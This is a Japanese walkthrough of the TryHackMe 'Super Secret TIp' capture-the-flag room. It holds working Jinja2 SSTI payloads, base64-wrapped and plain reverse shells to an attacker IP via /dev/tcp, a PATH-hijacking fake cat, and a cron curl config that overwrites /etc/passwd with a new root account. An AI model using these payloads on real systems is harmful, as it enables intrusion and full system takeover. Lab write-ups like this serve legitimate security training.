# Super Secret TIp CTF

https://tryhackme.com/room/supersecrettip

## Enumeration

### ポートスキャン

```shell
TARGET=10.10.47.54
sudo bash -c "echo $TARGET   xxxxxxxxx.thm >> /etc/hosts"

root@ip-10-10-70-28:~# sudo nmap -sS -p- $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-19 07:16 BST
Nmap scan report for 10.10.47.54
Host is up (0.000092s latency).
Not shown: 65533 closed ports
PORT     STATE SERVICE
22/tcp   open  ssh
7777/tcp open  cbt
MAC Address: 02:5E:63:A6:46:59 (Unknown)

root@ip-10-10-70-28:~# sudo nmap -sS -A -p22,7777 $TARGET
Starting Nmap 7.80 ( https://nmap.org ) at 2025-05-19 07:16 BST
Nmap scan report for 10.10.47.54
Host is up (0.00031s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 3e:b8:18:ef:45:a8:df:59:bf:11:49:4b:1d:b6:b8:93 (RSA)
|   256 0b:cf:f9:94:06:85:97:f6:bd:cc:33:66:4e:26:ea:27 (ECDSA)
|_  256 60:ce:be:2d:1e:f0:18:00:30:70:ff:a2:66:d7:85:f7 (ED25519)
7777/tcp open  cbt?
| fingerprint-strings:
|   GetRequest:
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.3.4 Python/3.11.0
|     Date: Mon, 19 May 2025 06:16:55 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 5688
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="description" content="SSTI is wonderful">
|     <meta name="author" content="Ayham Al-Ali">
|     <link rel="icon" href="favicon.ico">
|     <title>Super Secret TIp</title>
|     <!-- Bootstrap core CSS -->
|     <link href="/static/css/bootstrap.min.css" rel="stylesheet">
|     <!-- Custom styles for this template -->
|     <link href="/static/css/carousel.css" rel="stylesheet">
|     </head>
|     <!-- NAVBAR
|     ================================================== -->
|     <body>
|     <div class="navbar-wrapper">
|     <div class=
|   Socks5:
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request syntax ('
|     ').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port7777-TCP:V=7.80%I=7%D=5/19%Time=682ACCD3%P=x86_64-pc-linux-gnu%r(So
SF:cks5,18B,"<!DOCTYPE\x20HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<h
SF:ead>\n\x20\x20\x20\x20\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<title>Error\x20response</title>\n\x20\x20\
SF:x20\x20</head>\n\x20\x20\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x2
SF:0<h1>Error\x20response</h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x
SF:20code:\x20400</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\
SF:x20request\x20syntax\x20\('\\x05\\x04\\x00\\x01\\x02\\x80\\x05\\x01\\x0
SF:0\\x03'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20ex
SF:planation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported
SF:\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(GetRequest,11A
SF:7,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/2\.3\.4\x20Python/3\.1
SF:1\.0\r\nDate:\x20Mon,\x2019\x20May\x202025\x2006:16:55\x20GMT\r\nConten
SF:t-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x205688\r\nCo
SF:nnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n\x
SF:20\x20<head>\n\x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20
SF:\x20<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\">\n\x
SF:20\x20\x20\x20<meta\x20name=\"viewport\"\x20content=\"width=device-widt
SF:h,\x20initial-scale=1\">\n\n\x20\x20\x20\x20<meta\x20name=\"description
SF:\"\x20content=\"SSTI\x20is\x20wonderful\">\n\x20\x20\x20\x20<meta\x20na
SF:me=\"author\"\x20content=\"Ayham\x20Al-Ali\">\n\x20\x20\x20\x20<link\x2
SF:0rel=\"icon\"\x20href=\"favicon\.ico\">\n\n\x20\x20\x20\x20<title>Super
SF:\x20Secret\x20TIp</title>\n\n\x20\x20\x20\x20<!--\x20Bootstrap\x20core\
SF:x20CSS\x20-->\n\x20\x20\x20\x20<link\x20href=\"/static/css/bootstrap\.m
SF:in\.css\"\x20rel=\"stylesheet\">\n\n\x20\x20\x20\x20<!--\x20Custom\x20s
SF:tyles\x20for\x20this\x20template\x20-->\n\x20\x20\x20\x20<link\x20href=
SF:\"/static/css/carousel\.css\"\x20rel=\"stylesheet\">\n\x20\x20</head>\n
SF:<!--\x20NAVBAR\n==================================================\x20-
SF:->\n\x20\x20<body>\n\x20\x20\x20\x20<div\x20class=\"navbar-wrapper\">\n
SF:\x20\x20\x20\x20\x20\x20<div\x20class=");
MAC Address: 02:5E:63:A6:46:59 (Unknown)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 3.8 (95%), Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Linux 2.6.32 (92%), Linux 2.6.39 - 3.2 (92%), Linux 3.1 - 3.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

22, 7777 ポート。  
7777 ポートは BadRequest のエラーが返っているが、ブラウザでアクセスしたら Web ページが表示された。

Werkzeug/2.3.4 は CVE-2023-46136 の脆弱性があるが、DoS 攻撃に関するものなのでここでは使えない。

### gobuster

```shell
cat /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt | sort -u > ./dirlist.txt

gobuster dir -x=txt,php -u http://$TARGET:7777 -w ./dirlist.txt -t 30 -k

===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/cloud                (Status: 200) [Size: 2991]
/debug                (Status: 200) [Size: 1957]
Progress: 681570 / 681573 (100.00%)
===============================================================
Finished
===============================================================
```

/cloud, /debug エンドポイントを発見。

### /cloud

よく分からないファイルダウンロード画面。  
最大 6 桁の文字列を POST するようになっている。適当に入れると 404 エラーが返る。

```shell
ffuf -u http://$TARGET:7777/cloud -c -w /usr/share/wordlists/SecLists/Fuzzing/1-4_all_letters_a-z.txt -X POST -d 'download=FUZZ' -fc 404 -H 'Content-Type: application/x-www-form-urlencoded'
```

404 以外が返るパターンは発見できなかった。（帯域制限がかかったため、10 分の 1 も進まなかった）

単純にファイル名を送ればよいだけだった。  
画面で表示されていたファイル名でリストを作り、テスト。

```shell
$ ffuf -u http://10.10.145.76:7777/cloud -c -w ./files.txt -X POST -d 'download=FUZZ' -fc 404 -H 'Content-Type: application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.145.76:7777/cloud
 :: Wordlist         : FUZZ: /home/kali/ctf/0519/files.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : download=FUZZ
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

templates.py            [Status: 200, Size: 45, Words: 6, Lines: 4, Duration: 295ms]
MyApp.apk               [Status: 200, Size: 11, Words: 3, Lines: 1, Duration: 296ms]
VID_0022.MOV            [Status: 200, Size: 6714, Words: 30, Lines: 15, Duration: 294ms]
IMG_1425.NEF            [Status: 200, Size: 41166, Words: 167, Lines: 183, Duration: 294ms]
:: Progress: [7/7] :: Job [1/1] :: 12 req/sec :: Duration: [0:00:01] :: Errors: 0 ::
```

curl で 4 ファイル取得

```shell
$ curl http://10.10.145.76:7777/cloud -X POST -d 'download=templates.py' -o ./templates.py
```

```shell
$ ls -al
total 72
drwxrwxr-x 2 kali kali  4096 May 19 17:51 .
drwxrwxr-x 3 kali kali  4096 May 19 16:05 ..
-rw-rw-r-- 1 kali kali    98 May 19 17:41 files.txt
-rw-rw-r-- 1 kali kali 41166 May 19 17:51 IMG_1425.NEF
-rw-rw-r-- 1 kali kali    11 May 19 17:51 MyApp.apk
-rw-rw-r-- 1 kali kali    45 May 19 17:50 templates.py
-rw-rw-r-- 1 kali kali  6714 May 19 17:51 VID_0022.MOV

┌──(kali㉿kali)-[~/ctf/0519]
└─$ file ./IMG_1425.NEF
./IMG_1425.NEF: RIFF (little-endian) data, Web/P image, VP8 encoding, 621x414, Scaling: [none]x[none], YUV color, decoders should clamp

┌──(kali㉿kali)-[~/ctf/0519]
└─$ file ./MyApp.apk
./MyApp.apk: ASCII text, with no line terminators

┌──(kali㉿kali)-[~/ctf/0519]
└─$ file ./templates.py
./templates.py: Python script, ASCII text executable

┌──(kali㉿kali)-[~/ctf/0519]
└─$ file ./VID_0022.MOV
./VID_0022.MOV: JPEG image data, JFIF standard 1.01, aspect ratio, density 1x1, segment length 16, baseline, precision 8, 232x217, components 3
```

```shell
$ cat ./templates.py
from flask import *
import hashlib
import os
```

```shell
$ cat ./MyApp.apk
(7> !(=H =*
```

画像とビデオは開けない。かろうじて理解できるのは flask のテンプレートのみ。

py ファイルをファジング。

```shell
$ ffuf -u http://10.10.145.76:7777/cloud -c -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -X POST -d 'download=FUZZ.py' -fc 404 -H 'Content-Type: application/x-www-form-urlencoded'

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://10.10.145.76:7777/cloud
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : download=FUZZ.py
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 404
________________________________________________

source                  [Status: 200, Size: 2898, Words: 529, Lines: 87, Duration: 268ms]
templates               [Status: 200, Size: 45, Words: 6, Lines: 4, Duration: 264ms]
:: Progress: [4744/4744] :: Job [1/1] :: 75 req/sec :: Duration: [0:01:06] :: Errors: 0 ::
```

source.py, templates.py が見つかる。

### source.py

```python
from flask import *
import hashlib
import os
import ip # from .
import debugpassword # from .
import pwn

app = Flask(__name__)
app.secret_key = os.urandom(32)
password = str(open('supersecrettip.txt').readline().strip())

def illegal_chars_check(input):
    illegal = "'&;%"
    error = ""
    if any(char in illegal for char in input):
        error = "Illegal characters found!"
        return True, error
    else:
        return False, error

@app.route("/cloud", methods=["GET", "POST"])
def download():
    if request.method == "GET":
        return render_template('cloud.html')
    else:
        download = request.form['download']
        if download == 'source.py':
            return send_file('./source.py', as_attachment=True)
        if download[-4:] == '.txt':
            print('download: ' + download)
            return send_from_directory(app.root_path, download, as_attachment=True)
        else:
            return send_from_directory(app.root_path + "/cloud", download, as_attachment=True)
            # return render_template('cloud.html', msg="Network error occurred")

@app.route("/debug", methods=["GET"])
def debug():
    debug = request.args.get('debug')
    user_password = request.args.get('password')

    if not user_password or not debug:
        return render_template("debug.html")
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debug.html", error=error)

    # I am not very eXperienced with encryptiOns, so heRe you go!
    encrypted_pass = str(debugpassword.get_encrypted(user_password))
    if encrypted_pass != password:
        return render_template("debug.html", error="Wrong password.")


    session['debug'] = debug
    session['password'] = encrypted_pass

    return render_template("debug.html", result="Debug statement executed.")

@app.route("/debugresult", methods=["GET"])
def debugResult():
    if not ip.checkIP(request):
        return abort(401, "Everything made in home, we don't like intruders.")

    if not session:
        return render_template("debugresult.html")

    debug = session.get('debug')
    result, error = illegal_chars_check(debug)
    if result is True:
        return render_template("debugresult.html", error=error)
    user_password = session.get('password')

    if not debug and not user_password:
        return render_template("debugresult.html")

    # return render_template("debugresult.html", debug=debug, success=True)

    # TESTING -- DON'T FORGET TO REMOVE FOR SECURITY REASONS
    template = open('./templates/debugresult.html').read()
    return render_template_string(template.replace('DEBUG_HERE', debug), success=True, error="")

@app.route("/", methods=["GET"])
def index():
    return render_template('index.html')

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=7777, debug=False)
```

- .txt ファイルはアプリのルートディレクトリからダウンロードできる。→supersecrettip.txt をダウンロードできる。
- /debug において、`' & ; %` の 4 文字は不正文字とされる。
- supersecrettip.txt の内容は、/debug のパスワードを debugpassword で暗号化したもの。
- /debug では、debug パラメータがセッション変数に保存される。
- /debugresult で、'./templates/debugresult.html' に debug セッション変数が渡されて処理される。
- /debugresult では IP アドレスのチェックがある。

以上から、

1. debugpassword による暗号化の詳細不明
2. ip による IP アドレスチェックの詳細不明
3. './templates/debugresult.html' テンプレートの詳細不明

という３つの課題を解決する必要がある。

## 1. debugpassword による暗号化

```python
# I am not very eXperienced with encryptiOns, so heRe you go!
encrypted_pass = str(debugpassword.get_encrypted(user_password))
```

インポートしているモジュールを読みたいが、可能か？

```python
import ip # from .
import debugpassword # from .
```

ファイルインクルージョンの要領で、Null バイト追加したら取得できた。

```shell
$ curl http://10.10.145.76:7777/cloud -X POST -d 'download=debugpassword.py%00.txt' -o ./debugpassword.py
```

debugpassword.py

```python
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')
```

暗号化の詳細が分かったので、オフラインでクラックできる。

最初は何も考えずブルートフォースしたが、無駄だった。

```python
import pwn

def get_encrypted(passwd):
    return pwn.xor(bytes(passwd, 'utf-8'), b'ayham')

def main():
    filepath = "/usr/share/wordlists/rockyou.txt"
    try:
        with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                password = line.strip()
                encrypted = get_encrypted(password)

                if encrypted == b'[REDACTED]':
                    print(password)
                    return
    except FileNotFoundError:
        print('file not found.')

if __name__ == "__main__":
    main()
```

少し考えて、これで復元。/debug のパスワードを入手した。

```python
import pwn

def get_encrypted(encrypted):
    return pwn.xor(encrypted, b'ayham')

result = get_encrypted(b'[REDACTED]')
print(result.decode())
```

## 2. ip による IP アドレスチェック

ip.py

```python
host_ip = "127.0.0.1"
def checkIP(req):
    try:
        return req.headers.getlist("X-Forwarded-For")[0] == host_ip
    except:
        return req.remote_addr == host_ip
```

- `X-Forwarded-For: 127.0.0.1` を送ればよいことが分かった。

## 3. './templates/debugresult.html' テンプレート

テンプレートのファイル自体を入手するのは困難と思われるので、実行して探る。

debug の値を`aaa`として/debugresult をリクエストすると、下記の表示になる。

```
Debugging Results

┌──(ayham㉿AM-Kali)-[~]
└─$ debugging
aaa
```

`{{7*7}}` を送ると、49 と表示された。

下記でリバースシェル取得を狙ったが、反応がなかった。デバッグ結果の表示はブランク。

```python
{{request.application.__globals__.__builtins__.__import__("os").popen("echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzEwLjEzLjg1LjIzNC82NjY2IDA+JjE=|base64 -d|bash").read()}}
```

ls コマンドの実行は成功。

```
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("ls").read() }}
```

```
┌──(ayham㉿AM-Kali)-[~]
└─$ debugging
__pycache__
cloud
debugpassword.py
ip.py
source.py
static
supersecrettip.txt
templates
```

`cat /etc/passwd`

```
┌──(ayham㉿AM-Kali)-[~]
└─$ debugging
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
Debian-exim:x:101:103::/var/spool/exim4:/usr/sbin/nologin
ayham:x:1000:1000::/home/ayham:/bin/bash
F30s:x:1001:1001::/home/F30s:/bin/bash
```

2 ユーザーの id_rsa の取得は出来なかった。

```
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cat /home/ayham/.ssh/id_rsa").read() }}
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("cat /home/F30s/.ssh/id_rsa").read() }}
```

`ls -al /home/ayham`

```
┌──(ayham㉿AM-Kali)-[~]
└─$ debugging
total 32
drwxr-xr-x 1 ayham ayham 4096 Jun 24  2023 .
drwxr-xr-x 1 root  root  4096 Jun 24  2023 ..
-rw-r--r-- 1 ayham ayham  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 ayham ayham 3526 Mar 27  2022 .bashrc
drwxr-xr-x 3 ayham ayham 4096 Jun 24  2023 .cache
-rw-r--r-- 1 ayham ayham  807 Mar 27  2022 .profile
-rw-r--r-- 1 root  root    32 Apr  2  2023 flag1.txt
```

`ls -al /home/F30s`

```
┌──(ayham㉿AM-Kali)-[~]
└─$ debugging
total 32
drwxr-xr-x 1 F30s F30s 4096 Jun 24  2023 .
drwxr-xr-x 1 root root 4096 Jun 24  2023 ..
-rw-r--r-- 1 F30s F30s  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 F30s F30s 3526 Mar 27  2022 .bashrc
-rw-r--rw- 1 F30s F30s  807 Mar 27  2022 .profile
-rw-r--r-- 1 root root   17 May 19  2023 health_check
-rw-r----- 1 F30s F30s   38 May 22  2023 site_check
```

試行錯誤の結果、下記でリバースシェルを取れた。

```
{{ config.__class__.from_envvar.__globals__.__builtins__.__import__("os").popen("echo c2ggLWkgPiYgL2Rldi90Y3AvMTAuMTMuODUuMjQzLzY2NjYgMD4mMQ== | base64 -d | bash").read() }}
```

```shell
$ nc -nlvp 6666
listening on [any] 6666 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.204.48] 41416
sh: 0: can't access tty; job control turned off
$
```

フラグ１ゲット。

## 権限昇格１

.profile に書き込み権限が付いている。

```shell
ayham@482cbf2305ae:/home/F30s$ ls -al
total 32
drwxr-xr-x 1 F30s F30s 4096 Jun 24  2023 .
drwxr-xr-x 1 root root 4096 Jun 24  2023 ..
-rw-r--r-- 1 F30s F30s  220 Mar 27  2022 .bash_logout
-rw-r--r-- 1 F30s F30s 3526 Mar 27  2022 .bashrc
-rw-r--rw- 1 F30s F30s  807 Mar 27  2022 .profile
-rw-r--r-- 1 root root   17 May 19  2023 health_check
-rw-r----- 1 F30s F30s   38 May 22  2023 site_check
```

```shell
ayham@482cbf2305ae:/home/F30s$ cat ./health_check
Health: 1337/100
```

crontab

```
# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.daily; }
47 6    * * 7   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.weekly; }
52 6    1 * *   root    test -x /usr/sbin/anacron || { cd / && run-parts --report /etc/cron.monthly; }
*  *    * * *   root    curl -K /home/F30s/site_check
*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
```

F30s ユーザーになって curl オプションを設定出来れば、任意のファイルを上書きできる。  
/etc/passwd を上書きさせて root ユーザーを作ったり、SSH の認証済キーの上書きに利用できる可能性が高い。

```
*  *    * * *   root    curl -K /home/F30s/site_check
```

下記は、.profile を編集して環境変数を操作すれば、偽物の cat を実行させられるか？

```
*  *    * * *   F30s    bash -lc 'cat /home/F30s/health_check'
```

### 偽造 cat

中身がリバースシェルの、偽造 cat を作る。

```shell
ayham@482cbf2305ae:~$ echo 'sh -i >& /dev/tcp/10.13.85.243/6667 0>&1' > /home/ayham/cat
ayham@482cbf2305ae:~$ chmod +x /home/ayham/cat
```

.profile の最後で、 cat を置いたディレクトリを PATH に追加。

```shell
ayham@482cbf2305ae:/home/F30s$ cat .profile
（中略）
PATH=/home/ayham:$PATH
```

リバースシェル取得成功。

```shell
$ nc -nlvp 6667
listening on [any] 6667 ...
connect to [10.13.85.243] from (UNKNOWN) [10.10.204.48] 60144
sh: 0: can't access tty; job control turned off
$
```

## 権限昇格２

元々の curl 設定

```shell
F30s@482cbf2305ae:~$ /bin/cat ./site_check
url = "http://127.0.0.1/health_check"
```

パスワードハッシュを生成

```shell
┌──(kali㉿kali)-[~]
└─$ mkpasswd -m sha-512 secret
$6$nDhW5hXiHZL9TlWw$rPXpOfNOC/YxpbJBvhvVWfJECgEiJc44QogUjuRajjiK8q49RevyeEFZ.sT13dWx9kVJM42BfI2RLVGH29NU91
```

この行を passwd に追加し、HTTP リクエストさせる。

```shell
root2:$6$nDhW5hXiHZL9TlWw$rPXpOfNOC/YxpbJBvhvVWfJECgEiJc44QogUjuRajjiK8q49RevyeEFZ.sT13dWx9kVJM42BfI2RLVGH29NU91:0:0:root:/root:/bin/bash
```

curl のパラメータを設定。

```shell
echo 'url = "http://10.13.85.243:8000/passwd"' > /home/F30s/site_check
echo 'output = "/etc/passwd"' >> /home/F30s/site_check
```

上書き成功。

```shell
F30s@482cbf2305ae:~$ /bin/cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
（略）
F30s:x:1001:1001::/home/F30s:/bin/bash
root2:$6$nDhW5hXiHZL9TlWw$rPXpOfNOC/YxpbJBvhvVWfJECgEiJc44QogUjuRajjiK8q49RevyeEFZ.sT13dWx9kVJM42BfI2RLVGH29NU91:0:0:root:/root:/bin/bash
```

root シェル取得成功！

```shell
F30s@482cbf2305ae:~$ su root2
Password:
root@482cbf2305ae:/home/F30s# id
uid=0(root) gid=0(root) groups=0(root)
```

## 延長戦

```shell
root@482cbf2305ae:~# /bin/cat flag2.txt
b'[REDACTED-flag2]'
```

```shell
root@482cbf2305ae:~# /bin/cat secret.txt
b'[REDACTED-secret]'
```

キーを root に変えて secret を復号すると、[10-digits]XX になる。

XX の部分をブルートフォースし、最適な復号結果になっている行を選ぶ。

```python
import pwn

def get_encrypted(encrypted, key):
    return pwn.xor(encrypted, key)

encrypted = b'[REDACTED-flag2]'

for i in range(100):
    suffix = f"{i:02d}"  # '00' 〜 '99'
    key = f"[10-digits]XX{suffix}".encode()
    decrypted = get_encrypted(encrypted, key)
    try:
        decoded = decrypted.decode('utf-8')
        print(f"[{suffix}] {decoded}")
    except UnicodeDecodeError:
        # デコードできなかった場合はスキップ
        continue
```

## 振り返り

- /cloud エンドポイントは入力文字数との関係で、パラメータがファイル名の可能性を除外していたためインターフェース仕様を理解するのが難しかった。
- 一番思いつきにくく感じたのは、py ファイルのファジング。
- source.py を発見してからは、地道に進んでいくだけだったが、Null バイト追加やテンプレートインジェクションなど、過去に学習してメモっていたことが役立って非常に良かった。
